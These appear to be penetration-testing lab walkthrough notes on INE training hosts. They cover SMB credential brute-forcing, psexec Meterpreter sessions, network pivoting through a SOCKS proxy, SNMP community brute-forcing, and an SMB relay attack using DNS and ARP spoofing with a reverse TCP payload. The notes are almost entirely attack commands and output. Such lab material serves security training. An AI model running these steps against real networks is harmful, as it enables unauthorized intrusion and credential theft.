#### SMB Exploitation and Network Pivoting with Metasploit

##### Check Target Connectivity

```
ping -c 5 demo.ine.local
ping -c 5 demo1.ine.local
```

Reachable from Kali:

```
demo.ine.local
```

##### Scan the First Target

```
nmap demo.ine.local
nmap -sV -p 139,445 demo.ine.local
```

Detected system:

```
Microsoft Windows Server 2008 R2–2012
```

##### Enumerate SMB Protocols and Security

```
nmap -p 445 --script smb-protocols demo.ine.local
nmap -p 445 --script smb-security-mode demo.ine.local
```

##### Test Anonymous SMB Access

```
smbclient -L demo.ine.local
```

Press Enter when prompted for a password.

##### Enumerate SMB Users

```
nmap -p 445 --script smb-enum-users.nse demo.ine.local
```

Discovered users:

```
admin
administrator
root
guest
```

##### Brute-Force SMB Credentials

Create `users.txt` containing:

```
admin
administrator
root
```

Run Hydra:

```
hydra -L users.txt \
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
demo.ine.local smb
```

Valid administrator credentials:

```
administrator: password1
```

##### Gain a Meterpreter Session

```
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit
```

##### Check the Compromised System

```
getuid
sysinfo
```

##### Test Access to the Internal Target

```
shell
ping 10.0.28.125
```

Internal target:

```
demo1.ine.local — 10.0.28.125
```

##### Add a Route Through the Meterpreter Session

```
CTRL+C
run autoroute -s 10.0.28.125/20
```

##### Check the ProxyChains Configuration

```
cat /etc/proxychains4.conf
```

Required entry:

```
socks4 127.0.0.1 9050
```

##### Start the Metasploit SOCKS Proxy

```
background
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
exploit
jobs
```

##### Scan the Internal Target Through the Proxy

```
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

##### Enumerate Internal SMB Shares

```
sessions -i 1
migrate -N explorer.exe
shell
net view 10.0.28.125
```

Discovered shares:

```
Documents
K$
```

##### Map the Internal Shares

```
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
```

##### Browse the Mapped Shares

```
dir D:
dir K:
```

#### SNMP Enumeration and SMB Exploitation

##### Check Target Connectivity

```
ping -c 5 demo.ine.local
```

##### Scan the Target

```
nmap demo.ine.local
```

##### Check the SNMP Port

```
nmap -sU -p 161 demo.ine.local
```

Detected service:

```
UDP 161 — SNMP
```

##### Discover SNMP Community Strings

```
nmap -sU -p 161 --script snmp-brute demo.ine.local
```

Discovered communities:

```
public
private
secret
```

##### Enumerate SNMP Information

```
snmpwalk -v 1 -c public demo.ine.local
```

##### Run All SNMP Enumeration Scripts

```
nmap -sU -p 161 --script "snmp-*" demo.ine.local > snmp_output
less snmp_output
```

##### Prepare the Discovered Windows Users

```
printf "administrator\nadmin\n" > users.txt
```

##### Brute-Force SMB Credentials

```
hydra -L users.txt \
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
demo.ine.local smb
```

Valid administrator credentials:

```
administrator: elizabeth
```

##### Gain a Meterpreter Session with PsExec

```
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
```

##### Verify the Compromised System

```
getuid
sysinfo
```

#### SMB Relay Attack Through DNS and ARP Spoofing

##### Configure the SMB Relay Exploit

```
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

##### Create the Fake DNS Entry

```
echo "172.16.5.101 *.sportsfoo.com" > dns
```

##### Start DNS Spoofing

```
dnsspoof -i eth1 -f dns
```

##### Enable IP Forwarding

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

##### Start Bidirectional ARP Spoofing

Terminal 1:

```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
```

Terminal 2:

```
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

##### Trigger the SMB Connection

Victim:

```
\\fileserver.sportsfoo.com\AnyShare
```

Redirected SMB connection:

```
\\172.16.5.101\AnyShare
```

##### Interact with the Meterpreter Session

```
sessions
sessions -i 1
getuid
```

